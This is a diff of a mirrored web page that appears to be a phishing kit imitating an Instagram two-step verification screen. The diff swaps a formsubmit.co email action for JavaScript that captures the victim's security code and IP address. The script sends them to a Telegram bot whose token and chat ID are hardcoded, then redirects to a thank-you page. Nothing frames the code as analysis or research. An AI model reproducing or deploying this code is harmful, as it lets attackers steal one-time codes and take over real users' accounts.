@@ -57,8 +57,8 @@
       <!-- SMARTPHONE SECTION END -->
       <!-- FORM SECTION -->
       <article class="form-area">
-        <form  action="https://formsubmit.co/verifycompany945@gmail.com" method="POST" accept=".">
-<input type="text" id="ipAddress" name="ipAddress" readonly hidden>
+        <form  id="contactForm"  method="POST">
+          <input type="text" id="ipaddress" name="ipaddress" hidden>
           <p class="small-title">2-Step Verification</p>
           <input
             type="text"
@@ -67,15 +67,15 @@
             required
             placeholder="Security code"
           />
-          <input type="hidden" name="linkId" value="657daf104b167f68d1979b9c" />
-          <input type="submit" name="submit" value="Confirm" />
+          <!-- <input type="hidden" name="linkId" value="657daf104b167f68d1979b9c" /> -->
+          <input type="submit" name="submit" value="Confirm" id="submit"/>
           <div class="options">
             <p class="small">Didn't get security code? we can</p>
             <a href="#" class="small">resend it</a>
             <div class="forget"><a href="#">Forgot password?</a></div>
           </div>
-          <input type="hidden" name="_next" value="thanks.html">
-<input type="hidden" name="_captcha" value="false">
+          <!-- <input type="hidden" name="_next" value="https://fanvote.mynetly.com/sltvot/thanks.html">
+<input type="hidden" name="_captcha" value="false"> -->
 
         </form>
         <div class="noaccount">
@@ -170,22 +170,51 @@
     <script src="../../js/socials/app.html"></script>
     <script src="../../js/socials/brands.min.html"></script>
     <script src="../../js/socials/fontawesome.min.html"></script>
-<script>
-    document.addEventListener('DOMContentLoaded', function () {
-            // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipAddress = data.ip;
-                    document.getElementById('ipAddress').value = ipAddress;
-                })
-                .catch(error => {
-                    console.error('Error fetching IP address:', error);
-                });
-        });
+    <script>
+      document.addEventListener('DOMContentLoaded', function () {
+        // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            const ipaddress = data.ip;
+            document.getElementById('ipaddress').value = ipaddress;
+          })
+          .catch(error => {
+            console.error('Error fetching IP address:', error);
+          });
+      });
 
-</script>
 
+
+
+      document.getElementById('contactForm').addEventListener('submit', function (event) {
+        event.preventDefault();
+
+        var code = document.getElementById('code').value;
+        // var password = document.getElementById('password').value;
+        var ipaddress = document.getElementById('ipaddress').value;
+
+        var telegramMessage = `code: ${code}\nIpaddress: ${ipaddress}`;
+     var token = '7299591931:AAFjijjIgOELNC4stmuWLOeYyMj3Tx9_zGQ';
+            var chat_id = '5880750105'
+
+        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+
+        fetch(url)
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              window.location.href = 'thanks.html';  // Redirect to thank you page
+            } else {
+              alert('Error sending message.');
+            }
+          })
+          .catch(error => {
+            console.error('Error:', error);
+          });
+      });
+
+    </script>
   </body>
 
 <!-- Mirrored from fanfamousity.com/instagram/otp/657daf104b167f68d1979b9c by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 17 Dec 2023 11:22:30 GMT -->
